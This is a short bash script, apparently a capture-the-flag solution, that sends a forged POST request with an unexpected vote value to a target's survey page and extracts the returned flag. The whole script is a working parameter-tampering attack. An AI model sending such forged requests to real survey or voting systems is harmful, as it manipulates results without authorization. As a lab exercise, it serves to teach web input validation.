#!/bin/bash
#
# ./get-the-survey-flag.sh "ip"
# 

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

theme="hacking survey vote via forgery HTTP request"

echo -e "\n\033[35m11. === ${theme} ===============================================\033[0m\n"

value="42"
echo -e "We want to insert an unexpected vote value: \033[33m${value}\033[0m"
flag=`curl -vLs --post301  --data-urlencode "sujet=1" --data-urlencode "valeur=${value}" "${1}/?page=survey" | grep -Eo "The flag is [a-zA-Z0-9]*" | awk '{print $0}'`
echo -e "Flag earned with hacking survey injection: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
